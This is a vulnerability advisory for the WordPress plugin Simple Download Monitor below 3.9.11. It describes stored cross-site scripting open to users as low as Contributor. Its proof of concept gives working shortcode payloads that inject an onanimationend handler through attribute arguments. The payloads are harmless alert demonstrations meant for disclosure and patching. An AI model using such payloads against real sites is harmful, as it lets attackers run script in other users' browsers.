## WordPress Plugin Vulnerabilities

# Simple Download Monitor < 3.9.11 - Contributor+ Stored Cross-Site Scripting via Shortcodes

### Description

The plugin could allow users with a role as low as Contributor to perform Stored Cross-Site Scripting attack via 1) "color" or "css\_class" argument of sdm\_download shortcode, 2) "class" or "placeholder" argument of sdm\_search\_form shortcode.

### Proof of Concept

// all spaces must be replaced with a slash
[sdm\_download id="replace-with-real-download-post-id" color='"/style="animation-name:twentytwentyone-close-button-transition"/onanimationend="alert(origin)']
// fancy=2 or 3 also works
[sdm\_download id="599" fancy="1" css\_class='"style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(origin+2)']
[sdm\_search\_form class='" style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(origin)' placeholder='" style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(origin+2)']
